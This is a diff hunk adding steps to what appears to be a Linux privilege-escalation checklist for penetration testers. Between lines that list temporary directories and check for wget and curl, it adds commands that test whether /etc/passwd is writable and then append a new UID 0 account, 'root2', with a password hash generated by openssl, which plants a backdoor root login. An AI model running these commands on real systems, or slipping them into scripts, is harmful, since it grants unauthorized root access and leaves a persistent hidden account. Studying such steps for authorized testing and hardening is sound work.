@@ -90,6 +90,12 @@ ls -lsaht /tmp/
 ls -lsaht /var/tmp/
 ls -lsaht /dev/shm/
 
+### Check if /etc/passwd is writable by other users
+ls -al /etc/passwd
+### If writable then create a new root user by generating crypt password using openssl
+openssl passwd w00t
+echo root2:sVlXUNMTLmeaw:0:0:root:/root:/bin/bash >> /etc/passwd
+
 ### Checking for File transfer capabilities
 which wget
 which curl
